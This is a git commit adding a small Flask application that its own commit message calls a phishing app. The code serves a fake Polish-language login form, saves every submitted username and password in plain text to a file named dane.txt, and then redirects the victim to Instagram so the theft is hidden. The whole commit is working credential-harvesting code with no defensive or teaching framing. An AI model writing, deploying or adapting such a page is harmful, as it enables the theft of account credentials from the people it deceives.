9bae98b753825937490789ef99c6085462a6c2d1
Kacper <kacperklocko53@gmail.com>
2025-07-04 12:20:03 +0200

    Pierwszy commit phishing-app

---
+++ app.py
@@ -0,0 +1,31 @@
+from flask import Flask, request, render_template_string, redirect
+
+app = Flask(__name__)
+
+html = '''
+<!DOCTYPE html>
+<html lang="pl">
+<head><meta charset="UTF-8"><title>Logowanie</title></head>
+<body>
+  <h2>Logowanie</h2>
+  <form method="POST">
+    <input type="text" name="username" placeholder="Nazwa użytkownika" required><br><br>
+    <input type="password" name="password" placeholder="Hasło" required><br><br>
+    <input type="submit" value="Zaloguj się">
+  </form>
+</body>
+</html>
+'''
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form['username']
+        pwd = request.form['password']
+        with open('dane.txt', 'a') as f:
+            f.write(f'Login: {user}, Hasło: {pwd}\n')
+        return redirect('https://www.instagram.com')
+    return render_template_string(html)
+
+if __name__ == '__main__':
+    app.run()
